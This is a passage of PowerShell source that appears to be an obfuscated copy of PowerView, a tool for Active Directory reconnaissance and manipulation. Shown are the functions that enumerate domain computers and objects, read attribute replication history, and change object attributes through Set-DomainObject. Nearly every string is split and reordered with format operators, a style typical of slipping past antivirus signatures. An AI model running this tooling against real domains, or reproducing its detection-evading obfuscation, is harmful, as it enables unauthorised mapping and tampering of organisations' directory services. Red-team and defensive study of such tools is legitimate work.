                Write-Verbose ('[G'+'et'+'-D'+'om'+'ainComputer] '+'Sea'+'r'+'chin'+'g '+'fo'+'r '+'co'+'mp'+'uters '+'wit'+'h '+'si'+'te '+'name'+':'+' '+"$SiteName")
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters[("{1}{2}{0}"-f'lter','LDA','PFi')]) {
                Write-Verbose ('[G'+'et'+'-Dom'+'a'+'inComp'+'uter] '+'Usi'+'ng'+' '+'addit'+'i'+'onal '+'L'+'DAP '+'fil'+'te'+'r: '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }
            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match ("{0}{1}"-f'N','OT_.*')) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if ($PSBoundParameters[("{0}{1}{2}"-f 'F','indO','ne')]) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters[("{1}{0}"-f 'ing','P')]) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, ("{3}{1}{4}{0}{2}" -f'R','omput','aw','PowerView.C','er.'))
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, ("{5}{1}{3}{0}{4}{2}"-f'ompu','w','er','.C','t','PowerVie'))
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Get'+'-DomainComp'+'uter]'+' '+'Er'+'ror '+'dis'+'p'+'osi'+'ng '+'of'+' '+'th'+'e '+'R'+'esu'+'lts '+'objec'+'t'+': '+"$_")
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{4}{8}{5}{7}{9}{3}{6}" -f's','edVar','PSUseDeclar','t','M','h','s','anAssig','oreT','nmen'}, '')]
    [OutputType({"{2}{3}{0}{1}" -f 'iew.ADObjec','t','Po','werV'})]
    [OutputType({"{1}{6}{0}{4}{5}{2}{3}" -f'.ADOb','Pow','.R','aw','je','ct','erView'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{4}{3}{2}{1}{0}" -f 'me','Na','guished','in','Dist'}, {"{2}{3}{1}{0}"-f'e','m','SamAccoun','tNa'}, {"{0}{1}" -f'Nam','e'}, {"{4}{2}{1}{5}{3}{0}{6}" -f 'hedNam','stingu','rDi','s','Membe','i','e'}, {"{2}{3}{0}{1}" -f'mberN','ame','M','e'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filt','er'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'DSPath','A'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{4}{0}{2}" -f 'ont','n','roller','Domai','C'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{2}{1}{0}"-f'l','neLeve','O'}, {"{2}{0}{1}"-f're','e','Subt'})]
        [String]
        $SearchScope = ("{2}{0}{1}" -f're','e','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{1}{0}"-f'oup','Gr'}, {"{0}{1}" -f'N','one'}, {"{1}{0}" -f 'wner','O'}, {"{1}{0}" -f'acl','S'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{0}{2}{1}" -f 'Return','e','On'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f 'ain','Dom')]) { $SearcherArguments[("{1}{0}" -f 'n','Domai')] = $Domain }
        if ($PSBoundParameters[("{1}{0}{2}" -f'rt','Prope','ies')]) { $SearcherArguments[("{3}{0}{1}{2}"-f 'ope','rti','es','Pr')] = $Properties }
        if ($PSBoundParameters[("{1}{2}{0}{3}" -f'r','Se','a','chBase')]) { $SearcherArguments[("{2}{0}{1}" -f'as','e','SearchB')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f'Serv','er')]) { $SearcherArguments[("{1}{0}" -f 'rver','Se')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Se','Scope','arch')]) { $SearcherArguments[("{1}{2}{0}{3}"-f'arc','S','e','hScope')] = $SearchScope }
        if ($PSBoundParameters[("{2}{1}{0}{3}" -f 'geSiz','ltPa','Resu','e')]) { $SearcherArguments[("{0}{1}{2}{3}"-f'Res','u','ltPageSi','ze')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{4}{1}{0}{2}" -f'i','imeLim','t','S','erverT')]) { $SearcherArguments[("{0}{3}{2}{1}"-f'Se','mit','meLi','rverTi')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'y','Masks','Securit')]) { $SearcherArguments[("{2}{1}{0}" -f'sks','yMa','Securit')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'e','T','ombston')]) { $SearcherArguments[("{1}{0}{2}"-f'm','To','bstone')] = $Tombstone }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'tial','Cre','den')]) { $SearcherArguments[("{2}{1}{0}"-f 'tial','den','Cre')] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{0}{1}" -f '^','S-1-')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ((("{1}{0}"-f ')=','^(CN{0}OU{0}DC'))-f [ChAR]124)) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{0}{1}" -f'Doma','in')]) -and (-not $PSBoundParameters[("{0}{2}{1}{3}" -f'Se','chB','ar','ase')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('['+'G'+'et-Domain'+'O'+'b'+'ject]'+' '+'Extra'+'c'+'te'+'d '+'d'+'omain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        $SearcherArguments[("{1}{0}" -f'omain','D')] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning ('[Get'+'-D'+'o'+'main'+'Object]'+' '+'U'+'nable '+'to'+' '+'retrie'+'ve'+' '+'doma'+'in '+'s'+'earche'+'r '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments[("{0}{2}{1}" -f'D','n','omai')] = $ObjectDomain
                        Write-Verbose ('[Get-Domai'+'nO'+'b'+'j'+'e'+'c'+'t] '+'Extract'+'e'+'d '+'d'+'omain '+"'$ObjectDomain' "+'from'+' '+"'$IdentityInstance'")
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[("{2}{3}{1}{0}" -f 'lter','i','LDA','PF')]) {
                Write-Verbose ('[G'+'et-Do'+'mainObj'+'ect'+']'+' '+'Using'+' '+'a'+'dditio'+'nal '+'LDAP'+' '+'fil'+'ter:'+' '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match ("{1}{2}{0}"-f '*','NOT','_.')) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if ($PSBoundParameters[("{0}{2}{1}" -f'Fin','ne','dO')]) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, ("{3}{6}{0}{1}{4}{5}{2}" -f'w.AD','O','Raw','Pow','bjec','t.','erVie'))
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, ("{3}{0}{2}{1}"-f 'owerV','bject','iew.ADO','P'))
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Get-'+'D'+'omainObject'+'] '+'Error'+' '+'d'+'isposing'+' '+'of'+' '+'t'+'he '+'R'+'esul'+'ts '+'o'+'bj'+'ect: '+"$_")
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{0}{6}{2}{1}{4}" -f'seDeclare','nment','g','PS','s','U','dVarsMoreThanAssi'}, '')]
    [OutputType({"{6}{0}{5}{3}{2}{4}{1}"-f 'D','teHistory','tr','ctAt','ibu','Obje','PowerView.A'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}{4}{3}{2}" -f 'D','is','shedName','ingui','t'}, {"{2}{1}{0}" -f'me','ccountNa','SamA'}, {"{0}{1}" -f'Nam','e'}, {"{0}{5}{1}{2}{3}{4}" -f'Memb','s','h','ed','Name','erDistingui'}, {"{1}{3}{0}{2}"-f 'rNam','Memb','e','e'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ilter','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'D','A','SPath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{2}{3}{0}"-f'r','ma','inCon','trolle','Do'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{1}{2}{0}"-f'Level','On','e'}, {"{1}{0}"-f'ee','Subtr'})]
        [String]
        $SearchScope = ("{1}{0}"-f 'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ("{1}{3}{2}{0}" -f'ties','P','oper','r')    =   ("{5}{3}{1}{4}{0}{2}" -f 'tr','la','ibutemetadata','sds-rep','t','m'),("{1}{0}{3}{2}{4}"-f 'isting','d','dna','uishe','me')
            'Raw'           =   $True
        }
        if ($PSBoundParameters[("{0}{1}"-f 'Domai','n')]) { $SearcherArguments[("{1}{0}" -f'main','Do')] = $Domain }
        if ($PSBoundParameters[("{0}{1}{2}"-f'L','DAPFilte','r')]) { $SearcherArguments[("{1}{0}{3}{2}" -f'P','LDA','r','Filte')] = $LDAPFilter }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Search','Ba','se')]) { $SearcherArguments[("{1}{2}{0}" -f'e','Search','Bas')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}"-f'erver','S')]) { $SearcherArguments[("{1}{0}"-f 'erver','S')] = $Server }
        if ($PSBoundParameters[("{0}{1}{2}"-f 'S','earchSco','pe')]) { $SearcherArguments[("{0}{2}{3}{1}"-f'Se','pe','archS','co')] = $SearchScope }
        if ($PSBoundParameters[("{1}{2}{0}{3}" -f 'Page','Resu','lt','Size')]) { $SearcherArguments[("{1}{0}{2}"-f 'S','ResultPage','ize')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'Se','it','rverTim','eLim')]) { $SearcherArguments[("{0}{1}{3}{2}"-f 'Ser','v','Limit','erTime')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{2}{1}"-f'To','one','mbst')]) { $SearcherArguments[("{1}{2}{3}{0}"-f 'e','T','ombs','ton')] = $Tombstone }
        if ($PSBoundParameters[("{1}{0}" -f 'e','FindOn')]) { $SearcherArguments[("{0}{2}{1}" -f'Fi','One','nd')] = $FindOne }
        if ($PSBoundParameters[("{1}{2}{0}"-f'tial','Cred','en')]) { $SearcherArguments[("{2}{3}{0}{1}" -f'a','l','Crede','nti')] = $Credential }

        if ($PSBoundParameters[("{0}{1}{2}"-f'Pr','o','perties')]) {
            $PropertyFilter = $PSBoundParameters[("{2}{1}{0}"-f 'es','ti','Proper')] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{0}{2}"-f'it','Ident','y')]) { $SearcherArguments[("{1}{2}{0}" -f'y','Identi','t')] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[("{3}{1}{2}{0}" -f 'ame','st','inguishedn','di')][0]
            ForEach($XMLNode in $_.Properties[("{1}{0}{3}{6}{2}{5}{4}" -f 'sds-','m','ttrib','r','emetadata','ut','epla')]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ("{5}{1}{3}{6}{4}{0}{2}" -f 'ME','REPL','TA_DATA','_','_','DS_','ATTR') -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty ("{0}{1}"-f 'ObjectD','N') $ObjectDN
                        $Output | Add-Member NoteProperty ("{2}{0}{1}"-f't','tributeName','A') $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty ("{3}{1}{2}{0}"-f'ange','n','atingCh','LastOrigi') $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty ("{0}{1}"-f 'Vers','ion') $TempObject.dwVersion
                        $Output | Add-Member NoteProperty ("{0}{2}{1}{3}" -f 'Las','riginatingDsa','tO','DN') $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ("{7}{2}{3}{0}{1}{6}{5}{8}{4}" -f'DObjectA','ttri','rV','iew.A','y','Hist','bute','Powe','or'))
                        $Output
                    }
                }
                else {
                    Write-Verbose ('[Get'+'-Dom'+'ai'+'nObjectAttri'+'b'+'u'+'teHisto'+'ry] '+'Er'+'ror'+' '+'retrie'+'v'+'ing '+(('2Ajmsd'+'s'+'-repla'+'ttr'+'ibut'+'emetadata2Aj ') -crePlace ([chaR]50+[chaR]65+[chaR]106),[chaR]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{6}{5}{9}{2}{3}{1}{0}{7}{4}"-f'nA','eTha','dVar','sMor','signments','seDecl','U','s','PS','are'}, '')]
    [OutputType({"{0}{2}{7}{5}{4}{6}{3}{1}{10}{8}{9}" -f 'Pow','ttr','erView.A','A','L','ect','inked','DObj','ute','History','ib'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{3}{2}{1}{0}"-f'me','guishedNa','n','Disti'}, {"{2}{0}{1}{3}" -f'amAcc','ountN','S','ame'}, {"{1}{0}" -f'me','Na'}, {"{6}{3}{0}{1}{4}{2}{5}"-f'r','Dist','ished','mbe','ingu','Name','Me'}, {"{2}{1}{0}" -f 'me','emberNa','M'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'lter','Fi'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'h','at','ADSP'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{1}{2}" -f'Do','e','r','mainControl','l'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{0}"-f'vel','OneLe'}, {"{1}{0}"-f'btree','Su'})]
        [String]
        $SearchScope = ("{0}{2}{1}"-f 'Sub','ee','tr'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ("{0}{2}{1}"-f 'Pro','rties','pe')    =   ("{3}{1}{5}{2}{0}{4}{6}"-f 'a','-re','lv','msds','lu','p','emetadata'),("{4}{2}{0}{3}{1}{5}" -f'g','shed','tin','ui','dis','name')
            'Raw'           =   $True
        }
        if ($PSBoundParameters[("{0}{1}" -f 'Dom','ain')]) { $SearcherArguments[("{0}{1}" -f'Dom','ain')] = $Domain }
        if ($PSBoundParameters[("{3}{1}{2}{0}" -f'lter','P','Fi','LDA')]) { $SearcherArguments[("{2}{1}{0}"-f'er','Filt','LDAP')] = $LDAPFilter }
        if ($PSBoundParameters[("{1}{2}{0}"-f'se','Se','archBa')]) { $SearcherArguments[("{1}{0}{3}{2}"-f'c','Sear','e','hBas')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}"-f'ver','Ser')]) { $SearcherArguments[("{1}{0}"-f'rver','Se')] = $Server }
        if ($PSBoundParameters[("{0}{1}{2}"-f 'S','earchSco','pe')]) { $SearcherArguments[("{2}{1}{0}"-f'cope','earchS','S')] = $SearchScope }
        if ($PSBoundParameters[("{1}{0}{2}" -f'su','Re','ltPageSize')]) { $SearcherArguments[("{2}{1}{0}{3}"-f'a','ultP','Res','geSize')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{0}{2}"-f'rverTime','Se','Limit')]) { $SearcherArguments[("{3}{1}{2}{0}"-f'mit','erverTim','eLi','S')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'one','T','ombst')]) { $SearcherArguments[("{1}{2}{0}" -f'one','T','ombst')] = $Tombstone }
        if ($PSBoundParameters[("{3}{2}{1}{0}" -f 'al','edenti','r','C')]) { $SearcherArguments[("{0}{3}{2}{1}"-f'Cr','ial','t','eden')] = $Credential }

        if ($PSBoundParameters[("{3}{2}{0}{1}" -f 'pertie','s','o','Pr')]) {
            $PropertyFilter = $PSBoundParameters[("{1}{0}{2}" -f 'ie','Propert','s')] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{0}{2}"-f'e','Id','ntity')]) { $SearcherArguments[("{1}{0}{2}"-f 'ntit','Ide','y')] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[("{0}{1}{2}{3}" -f 'distingu','i','shed','name')][0]
            ForEach($XMLNode in $_.Properties[("{5}{3}{4}{6}{1}{2}{0}" -f'ata','em','etad','-','rep','msds','lvalu')]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ("{1}{0}{5}{6}{2}{3}{4}" -f '_','DS','ALUE_M','ETA_','DATA','R','EPL_V') -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty ("{1}{2}{0}" -f'N','Ob','jectD') $ObjectDN
                        $Output | Add-Member NoteProperty ("{3}{1}{2}{0}" -f'ame','ib','uteN','Attr') $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty ("{3}{1}{2}{0}" -f'ributeValue','t','t','A') $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty ("{2}{1}{3}{0}"-f'd','imeCreat','T','e') $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty ("{2}{3}{0}{1}"-f 'lete','d','Time','De') $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty ("{0}{1}{4}{5}{3}{2}{6}" -f 'La','stO','gC','ginatin','r','i','hange') $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty ("{2}{0}{1}" -f 'ersio','n','V') $TempObject.dwVersion
                        $Output | Add-Member NoteProperty ("{0}{1}{5}{3}{2}{4}" -f'La','stOrig','tingDs','na','aDN','i') $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ("{7}{8}{2}{3}{0}{5}{6}{4}{1}"-f 'ttri','tory','tLin','kedA','is','bu','teH','Power','View.ADObjec'))
                        $Output
                    }
                }
                else {
                    Write-Verbose ('[Ge'+'t'+'-DomainObj'+'ectLin'+'kedAtt'+'ri'+'bu'+'teH'+'i'+'story] '+'Er'+'ror'+' '+'r'+'e'+'trieving '+(('b18m'+'s'+'ds'+'-'+'replvaluem'+'etad'+'at'+'ab18'+' ')-crEPlACE([char]98+[char]49+[char]56),[char]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function Set-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{5}{7}{6}{4}{2}{0}"-f'tions','PSUse','ngingFunc','Shoul','eCha','dPro','tat','cessForS'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f'S','PS','Process','hould'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{3}{1}{2}" -f 'Distinguis','d','Name','he'}, {"{1}{0}{2}{3}{4}"-f 'amA','S','ccount','Nam','e'}, {"{0}{1}"-f'Nam','e'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'lace','Rep'})]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'er','Filt'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'ath','AD','SP'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{1}{0}{2}"-f'le','rol','r','DomainCon','t'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{1}{2}{0}"-f'el','OneLe','v'}, {"{2}{1}{0}"-f 'e','ubtre','S'})]
        [String]
        $SearchScope = ("{0}{1}"-f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters[("{1}{0}{2}"-f 'oma','D','in')]) { $SearcherArguments[("{0}{1}"-f 'Domai','n')] = $Domain }
        if ($PSBoundParameters[("{1}{0}{2}" -f'ilt','LDAPF','er')]) { $SearcherArguments[("{2}{3}{1}{0}"-f'ter','il','LDAP','F')] = $LDAPFilter }
        if ($PSBoundParameters[("{0}{2}{1}" -f 'Se','ase','archB')]) { $SearcherArguments[("{3}{1}{2}{0}"-f 'hBase','a','rc','Se')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}" -f 'r','Serve')]) { $SearcherArguments[("{1}{0}"-f 'erver','S')] = $Server }
        if ($PSBoundParameters[("{2}{1}{0}"-f'pe','hSco','Searc')]) { $SearcherArguments[("{1}{2}{0}" -f'pe','SearchSc','o')] = $SearchScope }
        if ($PSBoundParameters[("{2}{1}{3}{0}" -f 'eSize','a','ResultP','g')]) { $SearcherArguments[("{3}{0}{2}{4}{1}"-f 'es','e','ultPageS','R','iz')] = $ResultPageSize }
        if ($PSBoundParameters[("{2}{3}{1}{0}" -f 'it','m','ServerTim','eLi')]) { $SearcherArguments[("{1}{3}{0}{2}" -f 'TimeLi','Ser','mit','ver')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{2}{1}"-f 'T','mbstone','o')]) { $SearcherArguments[("{2}{0}{1}" -f 'mbs','tone','To')] = $Tombstone }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Cred','tial','en')]) { $SearcherArguments[("{3}{2}{0}{1}" -f 'e','ntial','red','C')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{2}{0}{1}" -f 'e','ntity','Id')]) { $SearcherArguments[("{0}{1}"-f 'Iden','tity')] = $Identity }

        
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if($PSBoundParameters[("{0}{1}"-f'Cle','ar')]) {
                try {
                    $PSBoundParameters[("{0}{1}" -f 'Cl','ear')] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        $Entry.$PropertyName.clear()
                    }
